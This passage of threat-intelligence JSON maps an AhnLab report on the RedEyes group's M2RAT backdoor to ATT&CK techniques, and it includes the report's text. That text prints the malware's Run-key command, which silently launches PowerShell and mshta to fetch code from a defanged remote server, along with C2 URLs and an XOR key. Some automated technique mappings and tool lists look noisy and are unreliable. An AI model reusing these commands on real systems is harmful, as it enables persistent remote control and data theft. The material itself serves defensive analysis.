            "description": "The M2RAT backdoor sends keylogging data and screenshot logs to the threat actor's server",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "keylogging data",
              "screenshot logs"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ce88e90a-7c53-454a-955e-d66e3d4e65b0",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Remote Access Tools",
            "attack_id": "T1219",
            "tactic": "Command and Control",
            "description": "M2RAT establishes remote control command by transmitting CMD commands from the threat actor's server",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "M2RAT",
              "CMD commands"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "326b767a-85a0-4732-accb-d3a5fd07be2f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exploitation of Vulnerability",
            "attack_id": "T1204",
            "tactic": "Initial Access",
            "description": "The RedEyes group exploited the HWP EPS vulnerability (CVE-2017-8291) to distribute malware",
            "confidence_score": 0.675,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CVE-2017-8291",
              "HWP EPS vulnerability",
              "Form.hwp"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "HWP",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "19dcd412-a422-4635-87d9-afbc0276018f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "The threat actor created a new process (lskdjfel.exe) in the %temp% path",
            "confidence_score": 0.669,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.314,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%temp%\\lskdjfel.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b27a724e-6dcf-45c5-acb1-ae09cd184711",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Exfiltration",
            "description": "Archiving collected data with password protection",
            "confidence_score": 0.667,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.7,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "RAR.exe",
              "-df",
              "-r",
              "-hp",
              "-m1"
            ],
            "tools": [
              "reg",
              "ping",
              "Winrar",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2081442b-6650-4d60-9f66-1411162543ed",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exfiltration Over Alternative Protocol",
            "attack_id": "T1048",
            "tactic": "Exfiltration",
            "description": "Exfiltrating data to the threat actor's server",
            "confidence_score": 0.658,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "result_[number]",
              "_Encoded MAC Address Value_cap",
              "_Encoded MAC Address Value_2"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "763958e8-b49b-4121-8cfe-ca726ee9f6bf",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "The M2RAT backdoor operates after being injected into explorer.exe",
            "confidence_score": 0.653,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "explorer.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8f29289d-64ea-4a93-ad24-8590115d36d4",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Process Hollowing",
            "attack_id": "T1093",
            "tactic": "Defense Evasion",
            "description": "The threat actor injected malware into explorer.exe",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "explorer.exe",
              "M2RAT"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f60eba17-0cf4-4f1e-b3d5-7a1c88384875",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Server Software",
            "attack_id": "T1584",
            "tactic": "Command and Control",
            "description": "Threat actor's server transmits CMD commands to M2RAT",
            "confidence_score": 0.65,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "threat actor's server"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "123c0b6c-21bf-4ed8-afa8-6f12631d9416",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Staging",
            "attack_id": "T1074",
            "tactic": "Exfiltration",
            "description": "Staging data in the %TEMP% path before exfiltration",
            "confidence_score": 0.65,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "%TEMP%\\Y_%m_%d_%H_%M_%S"
            ],
            "tools": [
              "reg",
              "ping",
              "Malware",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7662db78-9243-4b7b-aa6f-23d3f4f552a7",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1010",
            "tactic": "Discovery",
            "description": "Discovering application windows for data exfiltration",
            "confidence_score": 0.649,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PhoneDataCp",
              "PhoneDeviceManager"
            ],
            "tools": [
              "reg",
              ".NET",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b7df559e-e33f-4a95-8718-eaf63fa76457",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Input Capture",
            "attack_id": "T1056",
            "tactic": "Collection",
            "description": "Capturing input data from mobile phones",
            "confidence_score": 0.649,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "PhoneDeviceManager.pdb",
              "M2RAT"
            ],
            "tools": [
              "reg",
              ".NET",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a933bce9-d179-45ec-b723-1ecdc57f728f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Using PowerShell and cmd for execution",
            "confidence_score": 0.649,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Powershell",
              "cmd"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "PowerShell",
              "cve",
              "at",
              "powershell",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3b3540f2-e909-492f-bcd5-0f492d19a78c",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Data Staging",
            "attack_id": "T1074",
            "tactic": "Command and Control",
            "description": "Attacker used PE file for data staging",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "7bab405fbc6af65680443ae95c30595d"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "PE file",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "724d6eb8-1de8-43fb-ba74-2168b52bf5d7",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exploitation for Client Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "Attacker exploited EPS file for execution",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "8b666fc04af6de45c804d973583c76e0"
            ],
            "tools": [
              "reg",
              "ping",
              "EPS file",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "27a76eaf-be4b-4eb9-b89c-9952a5911d0c",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Attacker used cmd for execution",
            "confidence_score": 0.639,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe"
            ],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "73bc2224-56d5-4c78-bac2-365845f54f4f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Process Injection",
            "attack_id": "T1055",
            "tactic": "Defense Evasion",
            "description": "Detected Process Injection activity via NLP pattern matching",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.214,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "3812cd34-0272-4a55-89fd-57d76a3bd7e5",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "484887b8-9a33-4b47-8375-17191f0c201b",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Remote Access Tool",
            "attack_id": "T1219",
            "tactic": "Command and Control",
            "description": "Attacker used M2RAT",
            "confidence_score": 0.632,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.069,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "4488c709970833b5043c0b0ea2ec9fa9"
            ],
            "tools": [
              "reg",
              "ping",
              "M2RAT",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f39d13c9-d248-4b04-81fa-8238521ed6e5",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "ba205bb7-f4b3-48f7-a841-019177f768d1",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "9bd010dd-7f57-412e-ac77-269099e260d6",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "abc4d884-d29f-4bd2-9c85-4fb0b5f9f077",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "f3a13a36-0aa8-4ef9-b9d6-af987cea423e",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "50e0e0ea-6580-44d0-a3b8-48e3687b6319",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "9036e5f9-016b-4c5f-bae2-e512d304192f",
            "report_id": "pdf-6640e24b55da6a90485a0e04b23f885a",
            "technique_name": "Registry Run Keys",
            "attack_id": "T1547.001",
            "tactic": "Persistence",
            "description": "Detected Registry Run Keys activity via NLP pattern matching",
            "confidence_score": 0.623,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "ping",
              "Sc",
              "mshta",
              "Powershell",
              "powershell",
              "cve",
              "at",
              "xor",
              "shellcode",
              "net",
              "cmd",
              "base64",
              "apt",
              "rar"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 3 By muhan February 21  2023 HWP Malware Using the Steganography Technique: RedEyes (ScarCruft) asec.ahnlab.com/en/48063 In January  the ASEC (AhnLab Security Emergency response Center) analysis team discovered that the RedEyes threat group (also known as APT37  ScarCruft) had been distributing malware by exploiting the HWP EPS (Encapsulated PostScript) vulnerability (CVE-2017-8291). This report will share the RedEyes group s latest activity in Korea. 1. Overview The RedEyes group is known for targeting specific individuals and not corporations  stealing not only personal PC information but also the mobile phone data of their targets. A distinct characteristic of the latest RedEyes group attack is the fact that they exploited the HWP EPS vulnerability using the steganography technique to distribute their malware. The HWP EPS vulnerability used in the attacks is an old vulnerability that has already been patched in the latest version of the Hangul Word Processor. We assume that the threat actor initiated their attacks after checking in advance if their targets (individuals) were using an older version of HWP that supports EPS. Furthermore  there is a confirmed past case where the RedEyes group used the steganography technique to distribute malware. In 2019  Kaspersky shared a report saying that the ScarCruft (RedEyes) group s downloader used the steganography technique to download additional malware. The usage of the steganography technique to download malware and the RUN key command for autorun registration to establish a consistent connection with the C C server being similar to the format used by the RedEye group in the past are the reasons why we believe they had done this attack. The RedEyes group is also known for using Powershell and the Chinotto malware to steal PC information and remote control systems. However  a new malware strain was found in the latest attack which  unlike Chinotto  uses the shared memory section to carry out C C commands. Regarding the newly identified malware  the ASEC analysis team named it M2RAT (Map2RAT) after the name found in the shared memory section. Figure 1. Shared memory section name info This report covers the TTPs (Tactics  Techniques  and Procedures) of the RedEyes group s initial access  defense evasion  persistence  and the newly identified M2RAT s latest command control and exfiltration. 2 / 1 3 Figure 2. Flow chart of the attack scenario 2. Analysis 2.1. Initial Access On January 13  an HWP EPS vulnerability (CVE-2017-8291) attack involving the usage of the filename  Form.hwp  was discovered by AhnLab s ASD (AhnLab Smart Defense). The HWP document was not collected at the time of the analysis  but we were able to procure the EPS file that triggered the aforementioned vulnerability. Figure 3. ASD infrastructure log EPS is a type of graphic format that uses the PostScript programming language by Adobe to show graphics. High- resolution vector images can be shown through EPS and the Hangul Word Processor supported a third-party module (ghostscript) to process EPS files. However  due to an increase in malicious EPS vulnerability exploitations  such as APT attacks  Hancom has removed the third-party EPS processing module. Additionally  the ASEC analysis team posted a detailed analysis report on the CVE-2017-8291 vulnerability back in 2019. The  Form.hwp  file includes a vulnerable EPS file (CVE-2017-8291) which is shown in Figure 4. When the user opens the file ( Form.hwp )  the vulnerability allows the threat actor s shellcode to run through the third-party module. Figure 4. EPS vulnerability code within  Form.hwp  3 / 1 3 Figure 5. Stage 1: Shellcode execution through EPS vulnerability The shellcode downloads an image file (JPEG) from the threat actor s server (C C) and decrypts the encoded PE file contained within the image file. Afterward  it creates the PE file in the  temp  path before executing it. 2.2. Defense Evasion The shellcode downloaded an image file from the threat actor s server and executed an additional piece of malware. In other words  the threat actor used the steganography technique to embed a malware strain within an image. We assume that this was done to evade network detection. It appears that the steganography image file used by the threat actor was obtained from a wallpaper-sharing website called  wallup.net . 4 / 1 3 Figure 6. Steganography image file The image file consists of a normal JPEG header  the meta data required for decoding the PE file (XOR key and file size)  and the encoded PE file. Figure 7. Configuration info of steganography image A 16-byte XOR key is used for PE decoding to XOR 1 byte at a time. 5 / 1 3 16-byte xor key : FD DD 28 F5 7C 48 8E 7E 0C E0 17 77 35 87 3B 49 (0xFD xor 0xB0)   0x4D (M) (0xDD xor 0x87)   0x5A (Z) (0x28 xor 0xB8)   0x90 (0xF5 xor 0xF5)   0x00 (  MZ is the signature of the PE file.) The ultimately decoded PE file is created and executed under the name lskdjfel.exe in the  temp  path. The executed PE file is responsible for downloading an additional backdoor malware (M2RAT)  injecting it into explorer.exe  and adding both Powershell and mshta commands to the autorun registry Run key to establish a persistent connection with the threat actor s server. 2.3. Persistence The executed lskdjfel.exe file registers the following command to the registry Run key to establish a persistent connection with the threat actor s server. Registry key path: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Value name: RyPO Value: c:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 340328 2.2.2.2    mshta hxxps://www.     elearning.or[.]kr/popup/handle/1.html Figure 8. Stage 2: Execution of the decrypted PE file (Backdoor download and ensuring persistence) The command registered to the registry Run key was found to be similar to that of the ScarCruft (RedEyes) group report published by Kaspersky in 2021. [ScarCruft s registry Run key command in 2021 (by Kaspersky)] c:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 300000 2.2.2.2    mshta hxxp://[redacted].cafe24[.]com/bbs/probook/1.html 6 / 1 3 [RedEyes (ScarCruft) registry Run key command in 2023] c:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 340328 2.2.2.2    mshta hxxps://www.       elearning.or[.]kr/popup/handle/1.html Whenever the affected host PC is booted up  the registry key causes Powershell and the normal Windows utility  mshta  to also be executed. At the time of analysis  an HTA (HTML Application) file containing a JS (JavaScript) code was collected from the  1.html  file that mshta had downloaded from the threat actor s server. The JS code is responsible for executing the Powershell command  which receives and executes commands from the threat actor s server  and returns the results. When the Powershell adds a  U  parameter to the threat actor s server address when transmitting the computer name and username  the threat actor s server encodes the CMD command that is going to be executed in BASE64 before sending it to the affected host. The encoded BASE64 command is then decoded by Powershell and executed. The result of the command is saved as a file in the  temp \\vnGhazwFiPgQ path. Afterward  an  R  parameter is added to the threat actor s server which then encodes the command execution result in BASE64 before sending it. hxxps://www.       elearning.or[.]kr/popup/handle/log.php U [Computer Name] [Username] // Receive the threat actor s command hxxps://www.       elearning.or[.]kr/popup/handle/log.php R [BASE64-encoded] // Send command execution result 7 / 1 3 Figure 9. Persistence-related Powershell code 2.4. M2RAT (Map2RAT) The ultimately executed backdoor operates after being injected into explorer.exe. The main features of this backdoor are similar to those of basic remote control malware  which include keylogging  data leakage (files and recordings)  running or terminating processes  and capturing screenshots. 8 / 1 3 Figure 10. Stage 3: Execution of M2RAT backdoor However  the recently discovered backdoor has a different command system compared to the previously identified Chinotto malware. It does not save the keylogging data or screenshot logs in the affected system but instead sends them to the threat actor s server  leaving no traces of the stolen data in the affected system. The ASEC analysis team named this newly identified malware M2RAT (Map2RAT) after the common name within the shared memory section used during C C communication. FileInputMap2 ProcessInputMap2 CaptureInputMap2 RawInputMap2 RegistryModuleInputMap2 TypingRecordInputMap2 UsbCheckingInputMap2 2.4.1. Command and Control of M2RAT M2RAT s C C communications command system involves receiving commands from the threat actor s server through the POST method s Body. The meaning of these command can be found in the below Table 1. 9 / 1 3 Figure 11. Screenshot of M2RAT s C C communications (Fiddler) C C CommandDescription OKR Command received upon initial connection with C C communications URL Edits the registry key value to update the C C UPD Updates the currently connected C C RES Ends C C connection (End M2RAT) UNI Ends C C connection (End M2RAT) CMD 